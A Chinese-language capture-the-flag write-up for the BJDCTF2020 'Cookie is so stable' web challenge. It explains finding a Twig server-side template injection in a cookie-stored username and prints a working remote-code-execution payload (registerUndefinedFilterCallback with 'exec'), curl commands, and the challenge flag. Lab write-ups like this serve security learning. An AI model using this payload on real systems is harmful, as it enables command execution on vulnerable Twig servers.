---
title: "[BJDCTF2020]Cookie is so stable"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [ssti, twig, template-injection, cookie, php]
vulnerability: Twig 模板注入导致远程代码执行
solved: true
flag: "flag{72594795-7494-49b4-b152-addd6e0d03d0}"
---

# [BJDCTF2020]Cookie is so stable

## 题目概述
题目是一个简单的 PHP 网站，包含三个页面：`index.php`、`flag.php`、`hint.php`。页面标题 "Cookie_is_so_subtle!" 和题目名称 "Cookie is so stable" 暗示漏洞与 Cookie 相关。

## 信息收集
1. 访问 `hint.php`，HTML 注释提示：`<!-- Why not take a closer look at cookies? -->`
2. 访问 `flag.php`，发现一个表单要求输入 username
3. POST 提交 username 后，服务器设置 Cookie `user=<username>`
4. 再次访问 `flag.php` 时，页面显示 `Hello <username>`

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：Twig 服务端模板注入 (SSTI)

**判断过程**：
1. 提交 `{{7*7}}` 作为 username，页面显示 `Hello 49`，确认存在模板注入
2. 使用 `{{_self.env}}` 测试，确认是 Twig 模板引擎

**原理**：
- 用户输入的 username 被存储在 Cookie 中
- 服务器从 Cookie 读取 user 值并直接传入 Twig 模板渲染
- Twig 的 `_self.env.registerUndefinedFilterCallback()` 方法可以注册回调函数
- 配合 `getFilter()` 可实现任意代码执行

## 利用过程（Payload + Flag）

**Payload**：
```
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag')}}
```

**利用步骤**：
```bash
# 1. POST 提交 payload，存入 Cookie
curl -c cookies.txt -X POST "http://target/flag.php" \
  -d "username={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag')}}&submit=submit"

# 2. GET 请求触发模板渲染
curl -b cookies.txt "http://target/flag.php"
```

**Flag**：`flag{72594795-7494-49b4-b152-addd6e0d03d0}`

## 复现步骤
1. 访问 `flag.php`，提交 username 为 `{{7*7}}`
2. 刷新页面，看到 `Hello 49` 确认 SSTI
3. 提交 payload：`{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag')}}`
4. 刷新页面获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| SSTI | Cookie 中的 user 字段 | `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cmd')}}` | Twig 沙箱绕过、Cookie 注入 |

## 知识总结（解题技巧、同类题型套路）
1. **Cookie 注入点**：用户输入不只在 URL/Body，Cookie 也是常见注入点
2. **Twig SSTI 特征**：`{{}}` 语法，`_self.env` 对象可用于 RCE
3. **Twig RCE 方法**：
   - `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`
   - 适用于 Twig 1.x/2.x 版本
4. **同类题型**：看到 PHP + 模板渲染 + Cookie 存储，优先测试 SSTI
